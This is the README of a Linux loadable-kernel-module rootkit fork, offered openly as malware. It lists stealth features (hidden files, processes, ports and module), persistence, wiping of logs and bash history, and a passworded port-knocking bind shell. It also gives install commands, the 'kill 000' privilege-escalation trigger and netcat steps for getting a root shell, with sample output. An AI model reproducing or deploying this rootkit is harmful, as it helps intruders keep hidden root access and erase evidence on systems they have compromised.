<h2>Fork of BDS LKM ROOTKIT</h2>
<p>
Linux Loadable Kernel Module Rootkit for Linux Kernel 5.x and 6.x on x86_64.
<br>
Developed by : Antonius 
<br>
Website : www.bluedragonsec.com
<br>
Github : https://github.com/bluedragonsecurity
<br>
This lkm rootkit works on x64 architecture only.
</p>

<p>
<h3>Features</h3> 
<ul>
  <li>hides files and directories with prefix bds_</li>
  <li>port knocking bind shell (bind shell password is bluedragonsec)</li>
  <li>privilege escalation using kill 000 command</li>
  <li>hides bind shell port from netstat</li>
  <li>hides bind shell process</li>
  <li>rootkit persistence to survive after reboot</li>
  <li>hides module</li>
  <li>cleans up logs and bash history during installation</li>
</ul>
</p>
<h3>Installation</h3>
<p>
You need root privilege for installing this rootkit.
<br>
In case you have installed linux kernel headers, make and gcc, install it by running the installer script:
<br>
<pre>
./install.sh direct
</pre>
<br>
In case you haven't installed linux kernel headers, make and gcc, install it by running the installer script  :<br>
<br>
<pre>
./install.sh
</pre>
</p>
<h3>Using the Rootkit</h3>
<p>
<b>Privilege Escalation</b>  
<br>
Once the rootkit installed on the system, in case you lost root privilege, you can regain root privilege by typing : <b>kill 000</b>
<pre>
robotsoft@robotsoft:~$ id
uid=1000(robotsoft) gid=1000(robotsoft) groups=1000(robotsoft),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),999(sambashare)
robotsoft@robotsoft:~$ kill 000
robotsoft@robotsoft:~$ id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),999(sambashare),1000(robotsoft)
</pre>  
</p>
<p>
<b>Activating Bind Shell</b>
<br>
To activate bind shell, you need to do port knocking to your target server (with rootkit installed) on port 1338.
The bind shell password is : bluedragonsec
<br>
On your machine, open terminal and type:
<pre>
nc server_ip 1338
</pre>  
Wait a few seconds then type:
<pre>
nc server_ip 31337
type the password : bluedragonsec
</pre>
Example (server ip address with rootkit installed is at 192.168.0.102):
<pre>
robotsoft@robotsoft:~$ nc 192.168.0.102 1338
(wait a few seconds)
robotsoft@robotsoft:~$ nc 192.168.0.102 31337
Password :bluedragonsec
Linux robotsoft 5.11.0-49-generic #55-Ubuntu SMP Wed Jan 12 17:36:34 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
id
uid=0(root) gid=0(root) groups=0(root)
</pre>
</p>
<p>
<b>Hiding Files and Directories</b>
<br>
To hide file and directory just give prefix bds_ to file name and directory name
</p>
<p>
<b>How to Clean Logs and Bash History ?</b>
<br>
Before running installation script, add username to clean logs to usernames_to_clear_logs.txt in new line, example:
<pre>
root
robotsoft
</pre>
User logs will be cleaned during rootkit installation
</p>

<p>
<b>Persistence</b>
<br>
  The rootkit is activated every time the system starts up. After the reboot, wait for 1 minute, the rootkit will be loaded into kernel.
</p>

<p>
<b>Process Hiding</b>
<br>
This rootkit hides bind shell process and reverse shell process.
</p>

<p>
<b>Port Hiding</b>
<br>
This rootkit hides bind shell port and reverse shell port.
</p>
